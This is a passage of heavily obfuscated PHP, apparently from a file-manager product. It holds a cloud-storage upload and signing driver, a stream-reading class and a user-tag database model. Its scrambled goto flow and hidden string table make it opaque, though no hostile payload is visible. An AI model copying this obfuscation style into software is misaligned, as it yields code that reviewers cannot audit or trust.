$this->pathEncode($dÓã½¶ÕÓ), $FøÓ§‚Ì´[210] => $a´°›‡ĞÀ, $FøÓ§‚Ì´[89] => $dÓã½¶ÕÓ); } public function multiUploadAuthData($CÚÖòĞÃ°é, $fİÃÁ„ğ = array()) { goto b®Œ¾ÑÖ®©; eÀÈ®Ú’¹Š: if (isset($fİÃÁ„ğ[$F¹°µÖàÓ[1231]])) { $AÛ·†•ÈŠ­[$F¹°µÖàÓ[1232]] = $fİÃÁ„ğ[$F¹°µÖàÓ[1231]]; } $C´õ«éäš = explode($F¹°µÖàÓ[171], $this->getHost()); $aÚ«½¼ºŠ” = array($F¹°µÖàÓ[1233] => $C´õ«éäš[1], $F¹°µÖàÓ[1234] => $F¹°µÖàÓ[33], $F¹°µÖàÓ[199] => $F¹°µÖàÓ[116], $F¹°µÖàÓ[1146] => $fİÃÁ„ğ[$F¹°µÖàÓ[77]]); goto BÆ¸ÇŒ•£ƒ; BÆ¸ÇŒ•£ƒ: $eˆ¦ôË±ÉÍ = $F¹°µÖàÓ[214]; $eÁçç ¼Æ« = $F¹°µÖàÓ[8] . $this->pathEncode($A×µØÅƒÜâ) . $Fœˆè³µ¸¼; $A¾÷ĞÁ©³ = $this->client->__getSignatureV4($AÛ·†•ÈŠ­, $aÚ«½¼ºŠ”, $eˆ¦ôË±ÉÍ, $eÁçç ¼Æ«); goto C¡ô„¢Ö‹Ü; b®Œ¾ÑÖ®©: $F¹°µÖàÓ =& $_SERVER[‚Ğ°–—î]; $Fœˆè³µ¸¼ = isset($fİÃÁ„ğ[$F¹°µÖàÓ[160]]) ? $fİÃÁ„ğ[$F¹°µÖàÓ[160]] : $F¹°µÖàÓ[33]; $A×µØÅƒÜâ = $fİÃÁ„ğ[$F¹°µÖàÓ[89]]; goto F±¸ï‘§Šß; C¡ô„¢Ö‹Ü: if (strpos($Fœˆè³µ¸¼, $F¹°µÖàÓ[213]) === 0) { if (isset($AÛ·†•ÈŠ­[$F¹°µÖàÓ[1232]])) { $f‡çæÛñÌ« = $AÛ·†•ÈŠ­[$F¹°µÖàÓ[1232]]; } else { if (isset($A¾÷ĞÁ©³[$F¹°µÖàÓ[1232]])) { $f‡çæÛñÌ« = $A¾÷ĞÁ©³[$F¹°µÖàÓ[1232]]; } else { $f‡çæÛñÌ« = hash($F¹°µÖàÓ[1144], $F¹°µÖàÓ[33]); } } return array($F¹°µÖàÓ[220] => $A¾÷ĞÁ©³[$F¹°µÖàÓ[220]], $F¹°µÖàÓ[1232] => $f‡çæÛñÌ«, $F¹°µÖàÓ[210] => $A¾÷ĞÁ©³[$F¹°µÖàÓ[1235]]); } return $A¾÷ĞÁ©³[$F¹°µÖàÓ[220]]; goto cóŞõæÔœ; F±¸ï‘§Šß: unset($fİÃÁ„ğ[$F¹°µÖàÓ[89]]); if (isset($fİÃÁ„ğ[$F¹°µÖàÓ[211]])) { return $this->listUploadParts($A×µØÅƒÜâ, $fİÃÁ„ğ); } $AÛ·†•ÈŠ­ = array(); goto eÀÈ®Ú’¹Š; cóŞõæÔœ: } public function listUploadParts($a©Õµçõª, $EÜ÷äÏœ¶‡ = array()) { goto f³öæõ¶Íõ; e‰ÓŞ±¾: if (!$CøÊÆÊò) { return !1; } $Fê…‡Á¬© = $AâË¹ïàÔ‡[1236]; foreach ($CøÊÆÊò as $bˆÈ­èÓÙË) { $Fê…‡Á¬© .= $AâË¹ïàÔ‡[1237] . "\74\x50\x61\162\164\x4e\x75\x6d\x62\145\162\76{$bˆÈ­èÓÙË[$AâË¹ïàÔ‡[1188]]}\x3c\57\x50\141\x72\164\x4e\165\x6d\x62\x65\162\x3e\xa" . "\x3c\105\x54\141\x67\x3e{$bˆÈ­èÓÙË[$AâË¹ïàÔ‡[1189]]}\x3c\57\x45\124\x61\147\76\xa" . $AâË¹ïàÔ‡[1238]; } goto eä¨ñÈ±‘¢; eä¨ñÈ±‘¢: $Fê…‡Á¬© .= $AâË¹ïàÔ‡[1239]; $eßˆÒÊç¹– = array(); $AõÛŞÚªÏ = explode($AâË¹ïàÔ‡[171], $this->getHost()); goto B•Ã¾Ü—‚Õ; EéÑÏŒÕğ¶: $A¶»Éïï®ô = $this->client->__getSignatureV4($eßˆÒÊç¹–, $cà²Éêİ¡, $AèÛÜ÷”°, $AÁèÀù¸ˆá, $Fê…‡Á¬©); return array($AâË¹ïàÔ‡[220] => $A¶»Éïï®ô[$AâË¹ïàÔ‡[220]], $AâË¹ïàÔ‡[210] => $A¶»Éïï®ô[$AâË¹ïàÔ‡[1235]], $AâË¹ïàÔ‡[222] => $CøÊÆÊò, $AâË¹ïàÔ‡[1232] => $A¶»Éïï®ô[$AâË¹ïàÔ‡[1232]]); goto Dœ®’íäÀ; B•Ã¾Ü—‚Õ: $cà²Éêİ¡ = array($AâË¹ïàÔ‡[1233] => $AõÛŞÚªÏ[1], $AâË¹ïàÔ‡[199] => $AâË¹ïàÔ‡[116], $AâË¹ïàÔ‡[1146] => strlen($Fê…‡Á¬©)); $AèÛÜ÷”° = $AâË¹ïàÔ‡[212]; $AÁèÀù¸ˆá = $AâË¹ïàÔ‡[8] . $this->pathEncode($a©Õµçõª) . $EÜ÷äÏœ¶‡[$AâË¹ïàÔ‡[160]]; goto EéÑÏŒÕğ¶; f³öæõ¶Íõ: $AâË¹ïàÔ‡ =& $_SERVER[‚Ğ°–—î]; $ašƒÅ—ßª = str_replace($AâË¹ïàÔ‡[221], $AâË¹ïàÔ‡[33], $EÜ÷äÏœ¶‡[$AâË¹ïàÔ‡[160]]); $CøÊÆÊò = $this->client->listParts($this->bucket, $a©Õµçõª, $ašƒÅ—ßª); goto e‰ÓŞ±¾; Dœ®’íäÀ: } public function link($dÚ´áº²¸ß, $AÇ…´’ÈÓ = array()) { return parent::link($dÚ´áº²¸ß, $AÇ…´’ÈÓ); } public function fileOut($B¶‰ñ«îÓ¦, $C¼Æô¾™ = false, $DÂĞ¡ê… = false, $A‘»à¸Ü = '') { if (strstr($this->endpoint, $_SERVER[‚Ğ°–—î][1240])) { return parent::fileOutServer($B¶‰ñ«îÓ¦, $C¼Æô¾™, $DÂĞ¡ê…, $A‘»à¸Ü); } parent::fileOut($B¶‰ñ«îÓ¦, $C¼Æô¾™, $DÂĞ¡ê…, $A‘»à¸Ü); } public function fileOutImage($DÀÈËŸƒ»¥, $a–“¯ö¨âÛ = 250) { if (strstr($this->endpoint, $_SERVER[‚Ğ°–—î][1240])) { return parent::fileOutImageServer($DÀÈËŸƒ»¥, $a–“¯ö¨âÛ); } parent::fileOutImage($DÀÈËŸƒ»¥, $a–“¯ö¨âÛ); } public function fileOutLink($B‡±ï”ªœ‡) { $dÂÎ´¡ó•‘ =& $_SERVER[‚Ğ°–—î]; if (substr($B‡±ï”ªœ‡, 0, 7) == $dÂÎ´¡ó•‘[1116]) { $B‡±ï”ªœ‡ = $dÂÎ´¡ó•‘[1117] . substr($B‡±ï”ªœ‡, 7); } header($dÂÎ´¡ó•‘[156] . $B‡±ï”ªœ‡); die; } public function getHost() { $D¥¢´²„åÛ =& $_SERVER[‚Ğ°–—î]; $BĞ„ã“©‡Ä = str_rtrim(parent::getHost(), $D¥¢´²„åÛ[8] . $this->bucket); $BĞ„ã“©‡Ä = explode($D¥¢´²„åÛ[171], $BĞ„ã“©‡Ä); return $BĞ„ã“©‡Ä[0] . $D¥¢´²„åÛ[171] . $this->bucket . $D¥¢´²„åÛ[91] . $BĞ„ã“©‡Ä[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($DÑ±ñÊ‘„ï, $A¾ÒŒ¼ø = 0) { parent::__construct(); $this->source = $DÑ±ñÊ‘„ï; $this->sourceSize = $A¾ÒŒ¼ø; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($D‰ã¡ªÚª = false) { return $this->sourceSize; } public function getContent($e©®‹®¥š = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $D•«Õºì¥Ñ = ftell($this->source); $FÂ¿œø¹ëÌ = @fread($this->source, $this->sourceSize); fseek($this->source, $D•«Õºì¥Ñ); return $FÂ¿œø¹ëÌ; } } public function fileSubstr($cÛö×µ·è = false, $Eôˆ‘ÀŸ¯½ = 0, $e«®™ôËç— = 0) { if (!$e«®™ôËç—) { $e«®™ôËç— = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Eôˆ‘ÀŸ¯½, $e«®™ôËç—); } if ($this->sourceType == self::TYPE_FILE) { $BÁÈÚÌÛ = ftell($this->source); fseek($this->source, $BÁÈÚÌÛ + $Eôˆ‘ÀŸ¯½); $e¤Î —¶ªŒ = @fread($this->source, $e«®™ôËç—); fseek($this->source, $BÁÈÚÌÛ); return $e¤Î —¶ªŒ; } } public function hashMd5($Eë…Û‡¦°Ä = false) { return md5($this->getContent()); } public static function hash($c±ÚĞ†Î§², $Fáé¯­¨ = 0) { $dÌò­„î…õ = new PathDriverStream($c±ÚĞ†Î§², $Fáé¯­¨); return $dÌò­„î…õ->hashSimple($c±ÚĞ†Î§²); } public static function md5($fã‚ï°‚Ö, $D³Ç›çÖ¤‹ = 0) { $fè²¹‚¥Ï = new PathDriverStream($fã‚ï°‚Ö, $D³Ç›çÖ¤‹); return $fè²¹‚¥Ï->hashMd5($fã‚ï°‚Ö); } } goto d›ŸÑ…âÒÌ; DÖë‡œÃÎì: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($B¶…š‘è) { $B£ãˆ˜©İ¨ =& $_SERVER[‚Ğ°–—î]; return array($B£ãˆ˜©İ¨[2489] => array(USER_ID, $B£ãˆ˜©İ¨[2544])); } protected function listData() { $ağ²§©Ä =& $_SERVER[‚Ğ°–—î]; $DœùÈ¯Ê = array($ağ²§©Ä[1429] => USER_ID, $ağ²§©Ä[436] => array($ağ²§©Ä[2545], 0)); $bÙâ¡èÑÀÓ = $ağ²§©Ä[2546]; $F«ª†ÔÚä§ = $ağ²§©Ä[2547]; $D¡ÅŠ¹òè = $this->field($bÙâ¡èÑÀÓ)->where($DœùÈ¯Ê)->order($F«ª†ÔÚä§)->select(); return $D¡ÅŠ¹òè ? $D¡ÅŠ¹òè : array(); } protected function listByTag($C»ÖÓÛÒ½) { } protected function addToTag($Dá±¼Ôƒé, $FööÓğ‘ğ) { $cõÈ±…Ê… =& $_SERVER[‚Ğ°–—î]; if (!Model($cõÈ±…Ê…[2317])->listData($FööÓğ‘ğ) || !Model($cõÈ±…Ê…[752])->pathInfo($Dá±¼Ôƒé)) { return !1; } $D°ç”£ÀÙ = array($cõÈ±…Ê…[1429] => USER_ID, $cõÈ±…Ê…[436] => $FööÓğ‘ğ, $cõÈ±…Ê…[387] => $Dá±¼Ôƒé, $cõÈ±…Ê…[388] => $cõÈ±…Ê…[382], $cõÈ±…Ê…[386] => $cõÈ±…Ê…[33], $cõÈ±…Ê…[2111] => 0); if ($this->where($D°ç”£ÀÙ)->find()) { return !1; } return $this->add($D°ç”£ÀÙ); } protected function removeFromTag($aåš‘Ä›ïÉ, $a™îÌ‚Òäª) { $B¼˜¸„ˆŒ =& $_SERVER[‚Ğ°–—î]; if (!Model($B¼˜¸„ˆŒ[2317])->listData($a™îÌ‚Òäª)) { return !1; } if (is_array($aåš‘Ä›ïÉ)) { $aåš‘Ä›ïÉ = array($B¼˜¸„ˆŒ[7], $aåš‘Ä›ïÉ); } $f‹¥Š¿Ã‰¯ = array($B¼˜¸„ˆŒ[1429] => USER_ID, $B¼˜¸„ˆŒ[436] => $a™îÌ‚Òäª, $B¼˜¸„ˆŒ[388] => $B¼˜¸„ˆŒ[382], $B¼˜¸„ˆŒ[387] => $aåš‘Ä›ïÉ); return $this->where($f‹¥Š¿Ã‰¯)->delete(); } protected function removeByTag($A¯Í‹Óğ) { $Eñ„ÔŠ˜¹ç =& $_SERVER[‚Ğ°–—î]; if (!$A¯Í‹Óğ) { return !1; } $cøÏÓø‘ö¨ = array($Eñ„ÔŠ˜¹ç[1429] => USER_ID, $Eñ„ÔŠ˜¹ç[436] => $A¯Í‹Óğ); return $this->where($cøÏÓø‘ö¨)->delete(); } protected function removeBySource($Cå„…Ÿ×Œ†) { $FÀŠ¼‡¦Ù =& $_SERVER[‚Ğ°–—î]; $D¡šêœõÎ× = array($FÀŠ¼‡¦Ù[1429] => USER_ID, $FÀŠ¼‡¦Ù[387] => $Cå„…Ÿ×Œ†, $FÀŠ¼‡¦Ù[436] => array($FÀŠ¼‡¦Ù[929], 0)); return $this->where($D¡šêœõÎ×)->delete(); } }